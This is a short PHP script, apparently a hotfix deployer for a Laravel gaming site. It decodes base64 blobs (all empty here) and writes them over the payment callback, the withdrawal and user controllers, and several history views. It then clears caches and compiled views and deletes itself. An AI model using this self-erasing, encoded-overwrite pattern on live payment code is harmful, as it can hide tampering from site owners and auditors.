<?php
header('Content-Type: application/json');
$files = [
  'callback.php' => '',
  'core/app/Http/Controllers/User/UserController.php' => '',
  'core/resources/views/templates/sunfyre/user/withdraw/log.blade.php' => '',
  'core/app/Http/Controllers/User/WithdrawController.php' => '',
  'core/resources/views/templates/sunfyre/user/deposit_history.blade.php' => '',
  'core/resources/views/templates/sunfyre/user/game_log.blade.php' => '',
];
$out=[];
foreach ($files as $rel => $b64) {
  $p = __DIR__ . '/' . $rel;
  $dir = dirname($p);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  $out[$rel] = file_put_contents($p, base64_decode($b64));
}
if (is_file(__DIR__.'/core/vendor/autoload.php')) { require __DIR__.'/core/vendor/autoload.php'; $app=require __DIR__.'/core/bootstrap/app.php'; $k=$app->make(Illuminate\Contracts\Console\Kernel::class); $k->bootstrap(); $k->call('view:clear'); $k->call('cache:clear'); }
$n=0; foreach (glob(__DIR__.'/core/storage/framework/views/*.php') ?: [] as $f) { if(@unlink($f)) $n++; }
@unlink(__FILE__);
echo json_encode(['code'=>0,'written'=>$out,'views_cleared'=>$n,'fix'=>'history']);
